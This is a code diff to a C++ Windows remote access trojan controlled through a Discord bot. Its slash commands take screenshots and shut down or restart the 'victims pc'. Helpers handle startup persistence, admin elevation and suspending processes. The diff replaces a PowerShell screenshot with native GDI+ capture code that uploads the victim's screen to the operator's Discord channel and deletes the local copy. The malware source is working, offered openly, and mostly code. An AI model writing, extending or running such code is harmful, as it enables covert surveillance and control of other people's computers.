@@ -10,6 +10,7 @@
 #include <tlhelp32.h>
 #include <winternl.h>
 #include <processthreadsapi.h>
+#include <gdiplus.h>
 #include <winhttp.h>
 
 typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
@@ -18,24 +19,24 @@ typedef NTSTATUS(WINAPI* RtlSetProcessIsCritical)(BOOLEAN NewValue, BOOLEAN* Old
 
 #pragma comment(lib, "taskschd.lib")
 #pragma comment(lib, "comsupp.lib")
+#pragma comment (lib, "Gdiplus.lib")
 
-
-
-
-// Declare temp directory temp = C://...../temp
-std::filesystem::path temp = std::filesystem::temp_directory_path();
 
 //shit to change
-const long long int guildId = 217934877984371974987; // replace with guild id NO QUOTATION MARKS
-const std::string BOT_TOKEN = "Token-here";  // please dont fuck my shit up :( ima change this before it i release or not idk if ill remember
+const long long int guildId = 12376483628647; // serverid
+const std::string BOT_TOKEN = "Discord-token"; // thank you github for reminding me to not add the new one heree
 const bool autostart = false;
 
 // creates channel at startup and defines functions
+void Screenshot(const std::string& path);
 void suspend(const std::string& processName);
 void Startup();
 void getAdmin(HANDLE &hMutex);
 long long int Channelid_CreateChannel;
 void CreateChannel(dpp::cluster& bot, long long int &channellocationid);
+
+
+
 using namespace dpp;
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
@@ -87,16 +88,105 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     // takes screenshot
     bot.on_slashcommand([](const dpp::slashcommand_t& event) {
-        if (event.command.get_command_name() == "ss" && (event.command.channel_id == Channelid_CreateChannel)) {
-            std::string screenshotpath = temp.string() += "screenshot.png";
-            system("powershell Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; $graphics = [System.Drawing.Graphics]::FromImage($bitmap); $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); $bitmap.Save([System.IO.Path]::Combine([System.IO.Path]::GetTempPath(), 'screenshot.png')); $graphics.Dispose(); $bitmap.Dispose()");
+        if (event.command.get_command_name() == "screenshot" && (event.command.channel_id == Channelid_CreateChannel)) {
+            std::filesystem::path screenshot = std::filesystem::temp_directory_path();
+            std::string screenshot_string = screenshot.string() + "\\screenshot.png";
+            Gdiplus::GdiplusStartupInput gdiplusStartupInput;
+            ULONG_PTR gdiplusToken;
+            Gdiplus::Status status = Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
+            if (status != Gdiplus::Ok) {
+                event.reply("failed");
+            }
+            else {
+                HDC hdcScreen = GetDC(NULL);
+                if (!hdcScreen) {
+                    event.reply("failed");
+                }
+                else {
+                    HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
+                    if (!hdcMemDC) {
+                        event.reply("failed");
+                    }
+                    else {
+                        int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+                        int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+                        HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, screenWidth, screenHeight);
+                        if (!hBitmap) {
+                            event.reply("failed");
+                        }
+                        else {
+                            HGDIOBJ oldBitmap = SelectObject(hdcMemDC, hBitmap);
+                            if (oldBitmap == NULL || oldBitmap == HGDI_ERROR) {
+                                event.reply("failed");
+                            }
+                            else {
+                                if (!BitBlt(hdcMemDC, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY)) {
+                                    event.reply("failed");
+                                }
+                                else {
+                                    Gdiplus::Bitmap bitmap(hBitmap, NULL);
+                                    if (bitmap.GetLastStatus() != Gdiplus::Ok) {
+                                        event.reply("failed");
+                                    }
+                                    else {
+                                        std::wstring wpath(screenshot_string.begin(), screenshot_string.end());
+
+                                        auto GetEncoderClsid = [](const WCHAR* format, CLSID* pClsid) -> int {
+                                            UINT num = 0;
+                                            UINT size = 0;
+
+                                            Gdiplus::ImageCodecInfo* pImageCodecInfo = NULL;
+
+                                            Gdiplus::GetImageEncodersSize(&num, &size);
+                                            if (size == 0)
+                                                return -1;
+
+                                            pImageCodecInfo = (Gdiplus::ImageCodecInfo*)(malloc(size));
+                                            if (pImageCodecInfo == NULL)
+                                                return -1;
+
+                                            Gdiplus::GetImageEncoders(num, size, pImageCodecInfo);
+
+                                            for (UINT j = 0; j < num; ++j) {
+                                                if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
+                                                    *pClsid = pImageCodecInfo[j].Clsid;
+                                                    free(pImageCodecInfo);
+                                                    return j;
+                                                }
+                                            }
+
+                                            free(pImageCodecInfo);
+                                            return -1;
+                                            };
+
+                                        CLSID clsid;
+                                        if (GetEncoderClsid(L"image/png", &clsid) == -1) {
+                                            event.reply("failed");
+                                        }
+                                        else {
+                                            if (bitmap.Save(wpath.c_str(), &clsid, NULL) != Gdiplus::Ok) {
+                                                event.reply("failed");
+                                            }
+                                        }
+                                    }
+                                }
+                                SelectObject(hdcMemDC, oldBitmap);
+                            }
+                            DeleteObject(hBitmap);
+                        }
+                        DeleteDC(hdcMemDC);
+                    }
+                    ReleaseDC(NULL, hdcScreen);
+                }
+                Gdiplus::GdiplusShutdown(gdiplusToken);
+            }
             dpp::message msg(event.command.channel_id, "Image sent");
-            msg.add_file("screenshot.png", dpp::utility::read_file(screenshotpath));
+            msg.add_file("screenshot.png", dpp::utility::read_file(screenshot_string));
             event.reply(msg);
-            std::string commanddeletess = "del " + screenshotpath;
-            system(commanddeletess.c_str());
+            DeleteFileA(screenshot.string().c_str());
         }
-        else {
+        else {  
             std::cout << "not for me \n";
         }
         });
@@ -334,7 +424,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         if (dpp::run_once<struct register_bot_commands>()) {
 
             std::string Commandrun;
-            bot.global_command_create(dpp::slashcommand("ss", "Takes a screenshot", bot.me.id));
+            bot.global_command_create(dpp::slashcommand("screenshot", "Takes a screenshot", bot.me.id));
             bot.global_command_create(dpp::slashcommand("shutdown", "shutdowns victims pc", bot.me.id));
             bot.global_command_create(dpp::slashcommand("restart", "restarts victims pc", bot.me.id));
             bot.global_command_create(dpp::slashcommand("kill", "Kills itself (doesnt remove from startup)", bot.me.id));
@@ -513,6 +603,7 @@ void Startup() {
     CoUninitialize();
 }
 
+// get admin function
 void getAdmin(HANDLE &hMutex) {
         wchar_t szPath[MAX_PATH];
         if (GetModuleFileName(NULL, szPath, ARRAYSIZE(szPath)))
@@ -531,6 +622,7 @@ void getAdmin(HANDLE &hMutex) {
         }
 }
 
+// suspend a process to pause it
 void suspend(const std::string& processName) {
     int size_needed = MultiByteToWideChar(CP_UTF8, 0, &processName[0], (int)processName.size(), nullptr, 0);
     std::wstring wProcessName(size_needed, 0);
